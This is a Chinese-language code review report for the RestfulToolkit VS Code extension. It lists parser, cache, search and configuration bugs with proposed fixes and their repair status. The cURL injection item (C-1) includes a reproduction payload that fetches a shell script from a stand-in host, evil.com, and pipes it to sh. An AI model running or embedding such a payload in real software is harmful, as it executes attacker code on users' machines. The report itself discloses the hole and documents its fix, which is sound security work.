# RestfulToolkit 代码审查报告（2026-06-01）

> 审查日期：2026-06-01
> 审查范围：全部源代码（解析器、缓存/搜索、参数提取、扫描器/配置/工具）
> 状态：✅ P0/P1 与主要中低优先级小问题已修复（2026-06-02），剩余为较大结构优化或长期能力项

---

## 2026-06-02 Remaining Small Optimizations Closed
- **Fixed**: M-7/L-7/L-12/L-15 are now complete: `BaseUrlResolver` has an async VS Code filesystem path, extension shutdown resets runtime singletons, multi-root workspace project config is merged/reloaded, and Spring class-level `@RequestMapping` handles interfaces plus long annotation gaps.
- **Verified**: `npm run compile`, `npm test`, `test-all-files.js`, `test-parameter-copy.js`, `test-copy-url-curl.js`, and `test-json-to-class.js` all passed on 2026-06-02.
- **Remaining**: No open P0/P1 or explicit small-optimization items remain from this audit; future work is long-term capability expansion such as AST-level parsing and inherited route detection.

## 2026-06-02 修复状态

- **Fixed**: P0 编译阻断 — `ParameterExtractor` 补齐 `TextProcessor` 导入，`npm run compile` 恢复通过
- **Fixed**: C-2/C-3 — Spring `@RequestMapping` 路径提取改为显式解析 `value`/`path` 或第一个裸参数，避免参数顺序和 `produces`/`consumes` 误匹配
- **Fixed**: C-5 — JAX-RS 方法签名匹配改用净化文本，忽略注释中的伪方法签名
- **Fixed**: C-6 — `EndpointCache.size()` 改为按索引实时计算，防抖扫描等待工作区扫描结束后再更新缓存
- **Fixed**: H-4/H-5 — 项目配置解析增加类型校验和原型污染键过滤；搜索动态正则转义用户输入
- **Fixed**: JSON-to-DTO 新增风险 — `@JsonProperty` key 输出转义，覆盖同名文件前弹窗确认
- **Verified**: `npm run compile`、`npm run lint`、`npm test`、`test-all-files.js`、`test-parameter-copy.js`、`test-copy-url-curl.js`、`test-json-to-class.js` 均通过

## 2026-06-02 中低优先级小修状态

- **Fixed**: M-6/M-9/M-10/M-11/M-12 — Base URL YAML 层级约束、配置变化重建 watcher、搜索清空实时化、搜索输入防抖、项目配置类型校验
- **Fixed**: M-1/M-2/M-4/M-5/H-3/L-14 — 参数拆分、原始类型、签名括号净化、DTO 多文件选择、嵌套泛型和 DTO 注释净化已完成
- **Fixed**: L-1/L-5/L-6/L-8/L-11/L-16 — 搜索边界匹配、重复 Content-Type、SearchUI 释放、`@RequestMapping` 方法数组、`maxResults` 约束、全限定 REST 注解识别已完成
- **Remaining**: M-7/L-7/L-12/L-15 等属于较大结构优化或能力扩展：`BaseUrlResolver` 全异步化、单例热重载重置、多根工作区项目配置、复杂 class-vs-method 注解窗口优化

---

## 优先级说明

| 级别 | 含义 | 标准 |
|------|------|------|
| 🔴 严重 | 必须立即修复 | 影响安全或导致数据严重错误 |
| ⚠️ 高 | 尽快修复 | 影响功能正确性，用户可感知 |
| 📋 中 | 建议修复 | 影响性能或存在边界情况 Bug |
| 📝 低 | 可后续迭代 | 代码质量/可维护性/死代码问题 |

---

## 🔴 严重 (Critical) — 6 个

### C-1：cURL 命令注入漏洞

**文件**：`src/extractor/CurlConverter.ts`

**问题**：生成的 cURL 命令用单引号包裹 URL、Header、Body 值，但从未转义内嵌的单引号字符。注解路径如 `/api/test'$(curl evil.com/sh.sh|sh)'` 会被原样插入，用户复制到终端后可执行任意 shell 命令。

**复现场景**：

```java
@GetMapping("/api/test'$(curl evil.com/sh.sh|sh)'")
public String evil() { return ""; }
```

生成结果：
```
curl -X GET 'http://localhost:8080/api/test'$(curl evil.com/sh.sh|sh)''
```

**修复方案**：所有单引号值加转义 `'` → `'\''`：

```typescript
function escapeShellSingleQuote(value: string): string {
    return value.replace(/'/g, "'\\''");
}

// 使用
const parts: string[] = [`curl -X ${httpMethod} '${escapeShellSingleQuote(url)}'`];
parts.push(`  -H '${escapeShellSingleQuote(header)}'`);
parts.push(`  -d '${escapeShellSingleQuote(body)}'`);
```

**验证方式**：添加测试用例覆盖含单引号的路径、Header、Body 生成

---

### C-2：`@RequestMapping` 类级别路径正则匹配失败

**文件**：`src/parsers/SpringMvcParser.ts` (类级别路径解析)

**问题**：类级别 `@RequestMapping` 正则要求 `value`/`path` 是第一个参数。当 `method`/`produces`/`consumes` 等参数在前时，路径匹配失败，所有端点路径变短。

**复现场景**：

```java
@RestController
@RequestMapping(method = RequestMethod.GET, value = "/api/v1")
public class UserController { ... }  // 类路径 /api/v1 丢失！
```

**修复方案**：改为先提取整个注解括号内容，再从中解析 `value`/`path` 参数（忽略其他参数）：

```typescript
// 先提取括号内容
const parenMatch = annotationText.match(/@RequestMapping\s*\(([\s\S]*)\)/);
if (parenMatch) {
    const attrs = parenMatch[1];
    // 再从属性中查找 value 或 path
    const pathMatch = attrs.match(/(?:value|path)\s*=\s*"([^"]+)"/);
    if (pathMatch) return pathMatch[1];
}
```

**验证方式**：添加测试用例覆盖 `method` 在 `value` 之前的场景

---

### C-3：`pathMatch` 正则误匹配非路径字符串

**文件**：`src/parsers/SpringMvcParser.ts` (方法级路径解析)

**问题**：方法级路径正则匹配**任何**双引号字符串，当注解只有 `produces`/`consumes`/`headers` 但无路径时，会误将非路径字符串当成路径。

**复现场景**：

```java
@GetMapping(produces = "application/json")
public User getUser() { ... }  // 路径变成 "application/json"！
```

**修复方案**：在正则中限定 `value`/`path` 键名：

```typescript
// 修改前（匹配任何双引号字符串）
const pathMatch = annotationText.match(/(?:value\s*=\s*|path\s*=\s*)?"([^"]+)"/);

// 修改后（只匹配 value/path 键后面的值，或第一个无键名的值）
const pathMatch = annotationText.match(/(?:value\s*=\s*|path\s*=\s*|^\s*\(\s*)"([^"]+)"/);
```

或者更精确：先提取注解属性，排除 `produces`/`consumes`/`headers`/`params`/`name` 后再匹配路径值。

**验证方式**：测试 `@GetMapping(produces = "application/json")` 不应产生路径

---

### C-4：`extractClassBlock` 大括号匹配使用未净化内容

**文件**：`src/parsers/AnnotationParser.ts` (类块提取)

**问题**：类块边界的大括号深度计算在**原始内容**上执行，字符串字面量和注释中的 `{`/`}` 被计入深度，可能导致类块截断位置错误。`sanitized` 变量存在但未被使用。

**复现场景**：

```java
// JSON template: {"key": "value"}
public class MyController {
    public String x() { return "{"; }  // 多余的 { 和 } 扰乱计数
    @GetMapping("/test")               // ← 可能被截断
    public String test() { return "ok"; }
}
```

**修复方案**：在 `extractClassBlock` 中对大括号匹配使用 `sanitized` 文本：

```typescript
// 修改前
for (let j = firstBraceIndex; j < content.length; j++) {
    const char = content[j];

// 修改后
for (let j = firstBraceIndex; j < sanitized.length; j++) {
    const char = sanitized[j];
```

**验证方式**：测试 Controller 方法体内包含 `"{ }"` 字符串和 `// }` 注释

---

### C-5：JAX-RS 方法签名正则匹配未净化内容

**文件**：`src/parsers/JaxRsParser.ts` (方法签名匹配)

**问题**：方法签名正则在未净化内容上运行，注释中的方法签名会产生误匹配，导致**重复端点**。

**复现场景**：

```java
/*
 * Example: public User findById(int id) {
 */
@GET
@Path("/{id}")
public User getUser(@PathParam("id") int id) { ... }
```

注释中的签名被误匹配，导致端点重复。

**修复方案**：方法签名正则改为在 `sanitizedContent` 上执行：

```typescript
// 修改前
while ((methodMatch = methodSignaturePattern.exec(content)) !== null) {

// 修改后
while ((methodMatch = methodSignaturePattern.exec(sanitizedContent)) !== null) {
```

**验证方式**：测试注释中包含方法签名的 JAX-RS 文件，验证无重复端点

---

### C-6：缓存竞态条件 — 端点重复和计数器溢出

**文件**：`src/cache/EndpointCache.ts` + `src/scanner/FileScanner.ts`

**问题**：防抖文件扫描与全量工作区扫描并行时，对同一文件的缓存操作无同步保护。`_size` 计数器在 `add()` 时递增，在 `removeByFile()` 时按旧数组长度递减，可能膨胀或变为负数。

**影响**：进度报告数据失真，刷新完成后端点计数错误。

**修复方案**：

方案 A：在 `scanWorkspace` 开始时设置标志位，`scanFileDebounced` 检测到标志位时跳过（等全量扫描完成后再处理）：

```typescript
private isFullScanRunning = false;

async scanWorkspace() {
    this.isFullScanRunning = true;
    try {
        // ... 扫描逻辑
    } finally {
        this.isFullScanRunning = false;
    }
}

scanFileDebounced(uri: vscode.Uri) {
    if (this.isFullScanRunning) return; // 全量扫描会处理
    // ... 防抖逻辑
}
```

方案 B：`_size` 不维护独立计数器，在 `size()` 中实时计算：

```typescript
size(): number {
    let count = 0;
    for (const endpoints of this.endpoints.values()) {
        count += endpoints.length;
    }
    return count;
}
```

**验证方式**：快速连续保存多个文件同时触发全量刷新，检查端点数量一致性

---

## ⚠️ 高 (High) — 5 个

### H-1：JSON 输出无特殊字符转义

**文件**：`src/extractor/CurlConverter.ts`、`src/extractor/FormatConverter.ts`

**问题**：参数名/字段名直接插入 JSON 字符串，含 `"` 或 `\` 的名会产生格式错误的 JSON 输出。

**修复方案**：使用 `JSON.stringify()` 处理名称（去掉外层引号）：

```typescript
// 修改前
`"${name}": ""`

// 修改后
`${JSON.stringify(name)}: ""`
```

---

### H-2：`@RequestParam` 正则在嵌套括号处断裂

**文件**：`src/extractor/SpringParameterParser.ts`

**问题**：正则 `[^)]*` 匹配到第一个 `)` 就停止。`@RequestParam(value = "foo(bar)", required = true)` 中的 `foo(bar)` 会在 `)` 处截断。

**修复方案**：使用支持嵌套括号的正则：

```typescript
// 修改前
const pattern = new RegExp(`@${ann}\\s*\\(([^)]*)\\)`, 's');

// 修改后：支持括号和引号内的嵌套
const pattern = new RegExp(`@${ann}\\s*\\(((?:[^()"']|"[^"]*"|'[^']*')*)\\)`, 's');
```

---

### H-3：嵌套泛型类型被截断

**文件**：`src/extractor/DtoFieldExtractor.ts`

**问题**：正则 `<[^>]+>` 只匹配到第一个 `>`。`Map<String, List<User>>` 解析失败。

**修复方案**：改用深度跟踪解析器：

```typescript
function extractGenericType(typeStr: string): string | null {
    const start = typeStr.indexOf('<');
    if (start === -1) return null;
    let depth = 0;
    for (let i = start; i < typeStr.length; i++) {
        if (typeStr[i] === '<') depth++;
        else if (typeStr[i] === '>') depth--;
        if (depth === 0) return typeStr.substring(start + 1, i);
    }
    return null;
}
```

### H-4：`.restful-toolkit.json` 缺少 Prototype Pollution 保护导致的安全风险

**文件**：`src/config/ConfigManager.ts`

**问题**：直接调用 `JSON.parse(content)` 来解析项目内的 `.restful-toolkit.json` 配置文件。如果打开了恶意的第三方项目，其配置文件可能通过包含 `__proto__` 键来执行原型链污染（Prototype Pollution），甚至结合其他第三方库的漏洞导致更严重的安全风险。

**修复方案**：引入安全的 JSON 解析辅助函数，防御原型链污染，拒绝 `__proto__` 或 `constructor.prototype` 属性：

```typescript
function safeJsonParse(text: string): any {
    return JSON.parse(text, (key, value) => {
        if (key === '__proto__' || key === 'constructor') {
            return undefined;
        }
        return value;
    });
}
```

### H-5：`EndpointCache.matchAtWordBoundary` 存在正则表达式注入导致崩溃的风险

**文件**：`src/cache/EndpointCache.ts`

**问题**：在 `matchAtWordBoundary` 中，动态创建正则 `new RegExp('[A-Z]' + query, 'i')` 时未对输入 `query` 进行正则元字符转义。如果用户在搜索框中输入特殊正则字符（如 `(`, `*`, `+`, `?`），会导致 `SyntaxError` 异常，从而使整个搜索功能或扩展主机发生崩溃。

**修复方案**：在生成动态正则之前，先对 `query` 进行字符转义：

```typescript
function escapeRegExp(string: string): string {
    return string.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

// 在 matchAtWordBoundary 中使用
const escapedQuery = escapeRegExp(query);
const camelRegex = new RegExp(`[A-Z]${escapedQuery}`, 'i');
```

---

## 📋 中 (Medium) — 12 个

### M-1：JAX-RS `splitParameters` 不跟踪括号深度

**文件**：`src/extractor/JaxRsParameterParser.ts`

**问题**：只跟踪 `<>` 深度，不跟踪 `()` 深度。`@QueryParam("foo,bar")` 中的逗号会导致错误拆分。

**修复方案**：添加 `parenDepth` 跟踪，与 `SpringParameterParser.splitParameters` 保持一致。

---

### M-2：裸注解模式漏掉原始类型

**文件**：`src/extractor/SpringParameterParser.ts`

**问题**：`(?=[A-Z])` 只匹配大写开头的类型名，`@RequestBody int value` 和 `@RequestBody boolean enabled` 被跳过。

**修复方案**：

```typescript
// 修改前
const barePattern = new RegExp(`@${ann}\\s+(?=[A-Z])`);

// 修改后
const barePattern = new RegExp(`@${ann}\\s+(?=[A-Za-z])`);
```

---

### M-3：`findMethodAtPosition` 启发式回溯脆弱

**文件**：`src/extractor/ParameterExtractor.ts`

**问题**：
- `/\b(public|private|protected)\b/` 匹配字段声明和内部类
- 大括号深度跟踪使用 `startsWith('{')` 等启发式，不可靠
- `}` 后跟 `else`/`catch` 的模式未处理

**修复方案**：使用 `TextProcessor.sanitize()` 净化后的内容做括号匹配，改进停止条件。

---

### M-4：多行签名中字符串字面量污染括号深度计数

**文件**：`src/extractor/ParameterExtractor.ts`

**问题**：方法签名的括号深度计数未忽略字符串字面量中的括号。`@RequestParam(")hello(")` 会导致 `parenDepth` 提前归零。

**修复方案**：在括号深度计数循环中使用 `TextProcessor.sanitize()` 净化后的内容。

---

### M-5：DTO 文件选择仅用类名，多模块项目可能选错

**文件**：`src/extractor/DtoFieldExtractor.ts`

**问题**：`**/${dtoTypeName}.{java,kt}` 在多模块项目中可能匹配多个文件，取 `files[0]` 可能选错。

**修复方案**：利用 import 语句中的包名缩小搜索范围，或优先选择同模块的文件。

---

### M-6：`context-path` 回退正则匹配任意 YAML 层级

**文件**：`src/utils/BaseUrlResolver.ts`

**问题**：回退正则 `context-path:\s*(.+)$` 匹配文件中任意位置的 `context-path`，可能匹配到 `management.endpoint.context-path`。

**修复方案**：回退正则加上 `server` 前缀约束，或限定缩进层级。

---

### M-7：`BaseUrlResolver` 同步 I/O 阻塞扩展宿主

**文件**：`src/utils/BaseUrlResolver.ts`

**问题**：`readdirSync` 和 `readFileSync` 在整个类中使用，阻塞 Extension Host 主线程。

**修复方案**：改用 `vscode.workspace.fs.readFile()` 等异步 API。

---

### M-8：`deactivate()` 同步执行

**文件**：`src/extension.ts`

**问题**：`deactivate()` 不是 `async`，异步清理可能未完成扩展宿主就终止。

**修复方案**：

```typescript
export async function deactivate() {
    logger.info('RestfulToolkit extension deactivated');
}
```

---

### M-9：配置变更后文件监视器不重建

**文件**：`src/utils/FileWatcher.ts`

**问题**：`start(patterns)` 只在启动时调用，用户修改 `scanPaths` 设置后监视器不会更新。

**修复方案**：监听 `vscode.workspace.onDidChangeConfiguration` 事件，配置变更时重建监视器。

---

### M-10：搜索框清空显示过期快照

**文件**：`src/ui/SearchUI.ts`

**问题**：打开搜索时缓存快照一次，输入时查实时缓存，清空时回退到过期快照。用户体验不一致。

**修复方案**：清空搜索框时也使用 `this.cache.getAll()` 获取实时数据。

---

### M-11：搜索输入无防抖，每次按键全量计算

**文件**：`src/ui/SearchUI.ts` + `src/cache/EndpointCache.ts`

**问题**：
- 每次按键触发 `search()` → `flattenAll()` 创建新数组 → 500+ 端点评分计算
- `alwaysShow: true` 绕过 VS Code 内置过滤
- `flattenAll()` 使用 `spread` 运算符分配开销大

**修复方案**：

```typescript
// SearchUI: 添加 150ms 防抖
private searchDebounceTimer: NodeJS.Timeout | undefined;

quickPick.onDidChangeValue((value) => {
    clearTimeout(this.searchDebounceTimer);
    this.searchDebounceTimer = setTimeout(() => {
        this.filterEndpoints(quickPick, value, allEndpoints);
    }, 150);
});

// EndpointCache.flattenAll(): 用循环替代 spread
private flattenAll(): RestEndpoint[] {
    const all: RestEndpoint[] = [];
    for (const endpoints of this.endpoints.values()) {
        for (const ep of endpoints) {
            all.push(ep);
        }
    }
    return all;
}
```

---

### M-12：`.restful-toolkit.json` 无内容校验

**文件**：`src/config/ConfigManager.ts`

**问题**：`JSON.parse(content)` 后无类型校验，畸形配置可能导致运行时错误。

**修复方案**：添加基本的类型校验：

```typescript
function validateProjectConfig(config: unknown): ProjectConfig | null {
    if (typeof config !== 'object' || config === null) return null;
    const c = config as Record<string, unknown>;
    if (c.scanPaths && !Array.isArray(c.scanPaths)) return null;
    if (c.excludePaths && !Array.isArray(c.excludePaths)) return null;
    if (c.maxResults && typeof c.maxResults !== 'number') return null;
    return config as ProjectConfig;
}
```

---

## 📝 低 (Low) — 16 个

| # | 问题 | 位置 |
|---|------|------|
| L-1 | `matchAtWordBoundary` 正则对大写开头查询失败，且不处理文本起始位置 | `EndpointCache.ts` |
| L-2 | `SearchQuery.filters` 定义了但从未使用（死代码） | `EndpointCache.ts`、`types.ts` |
| L-3 | `fuzzyMatch` 评分阈值过高，0.3/0.5 分级基本不可达，模糊搜索名存实亡 | `EndpointCache.ts` |
| L-4 | 表单字段名未 URL 编码，`foo bar` 变成 `foo bar=` 而非 `foo+bar=` | `CurlConverter.ts` |
| L-5 | cURL 可能生成重复 `Content-Type` 头（`@RequestHeader("Content-Type")` 时） | `CurlConverter.ts` |
| L-6 | `searchUI` 未加入 `context.subscriptions`，可能泄漏事件监听 | `extension.ts` |
| L-7 | 单例（ConfigManager/Logger）在 F5 重激活时不重置，残留旧状态 | `extension.ts` |
| L-8 | `@RequestMapping(method=...)` 不支持数组语法 `{GET, POST}` 和静态导入 `GET` | `SpringMvcParser.ts` |
| L-9 | JAX-RS `findMethodAnnotationBlock` 后向扫描停止条件弱，可能跨方法 | `JaxRsParser.ts` |
| L-10 | `content.indexOf(annotationBlock)` 可能匹配到文件中更早的同名注解块 | `JaxRsParser.ts` |
| L-11 | `maxResults` 无上下限约束（0 或 999999999 均可） | `ScanConfig.ts` |
| L-12 | 多根工作区只加载第一个文件夹的 `.restful-toolkit.json` | `extension.ts` |
| L-13 | `matchAtWordBoundary` camelCase 正则对 PascalCase 查询（如 "UserController"）几乎永不匹配 | `EndpointCache.ts` |
| L-14 | `DtoFieldExtractor` 未使用 `TextProcessor.sanitize()`，注释中的字段声明会被误解析 | `DtoFieldExtractor.ts` |
| L-15 | `class vs method` `@RequestMapping` 检测使用 300 字符窗口，长注释会导致误判；不识别 `interface` | `SpringMvcParser.ts` |
| L-16 | 解析器无法匹配全限定名（如 `@org.springframework.web.bind.annotation.GetMapping`）的注解 | `SpringMvcParser.ts`、`JaxRsParser.ts` |

---

## 修复优先级建议

### 第一批（安全 + 核心正确性）

| 编号 | 预估工作量 | 说明 |
|------|-----------|------|
| C-1 | 0.5h | cURL 注入 — 加一个 `escapeShellSingleQuote` 函数 |
| C-2 | 1h | @RequestMapping 类路径正则重写 |
| C-3 | 1h | pathMatch 正则限定键名 |
| C-4 | 0.5h | extractClassBlock 使用 sanitized |
| C-5 | 0.5h | JAX-RS 方法签名使用 sanitizedContent |
| C-6 | 1h | 缓存竞态保护 |
| H-1 | 0.5h | JSON 转义 |
| H-2 | 0.5h | @RequestParam 括号嵌套 |
| H-3 | 0.5h | 嵌套泛型深度跟踪 |
| H-4 | 0.5h | 配置文件原型链污染防御 |
| H-5 | 0.5h | 搜索正则注入防御 |

**小计**：约 7 小时

### 第二批（功能正确性 + 性能）

| 编号 | 预估工作量 | 说明 |
|------|-----------|------|
| M-1 | 0.5h | JAX-RS splitParameters 括号深度 |
| M-2 | 0.1h | 裸注解模式大小写 |
| M-3 | 1h | findMethodAtPosition 启发式改进 |
| M-4 | 0.5h | 签名括号深度净化 |
| M-7 | 1h | BaseUrlResolver 异步 I/O |
| M-10 | 0.3h | 搜索快照一致性 |
| M-11 | 0.5h | 搜索防抖 + flattenAll 优化 |

**小计**：约 4 小时

### 第三批（改进 + 清理）

剩余 M-5/M-6/M-8/M-9/M-12 和 L 级别问题（含 L-16），按需迭代。

---

## 涉及文件汇总

| 优先级 | 文件 | 关联编号 |
|--------|------|----------|
| 🔴 | `src/extractor/CurlConverter.ts` | C-1, H-1, L-4, L-5 |
| 🔴 | `src/parsers/SpringMvcParser.ts` | C-2, C-3, L-8, L-15, L-16 |
| 🔴 | `src/parsers/AnnotationParser.ts` | C-4 |
| 🔴 | `src/parsers/JaxRsParser.ts` | C-5, L-9, L-10, L-16 |
| 🔴 | `src/cache/EndpointCache.ts` | C-6, H-5, L-1, L-2, L-3, L-13 |
| ⚠️ | `src/extractor/FormatConverter.ts` | H-1 |
| ⚠️ | `src/extractor/SpringParameterParser.ts` | H-2 |
| ⚠️ | `src/extractor/DtoFieldExtractor.ts` | H-3, L-14 |
| 📋 | `src/extractor/JaxRsParameterParser.ts` | M-1 |
| 📋 | `src/extractor/ParameterExtractor.ts` | M-3, M-4 |
| 📋 | `src/utils/BaseUrlResolver.ts` | M-6, M-7 |
| 📋 | `src/utils/FileWatcher.ts` | M-9 |
| 📋 | `src/ui/SearchUI.ts` | M-10, M-11, L-6 |
| 📋 | `src/config/ConfigManager.ts` | H-4, M-12 |
| 📋 | `src/scanner/FileScanner.ts` | C-6 |
| 📝 | `src/extension.ts` | M-8, L-6, L-7, L-12 |
| 📝 | `src/config/ScanConfig.ts` | L-11 |
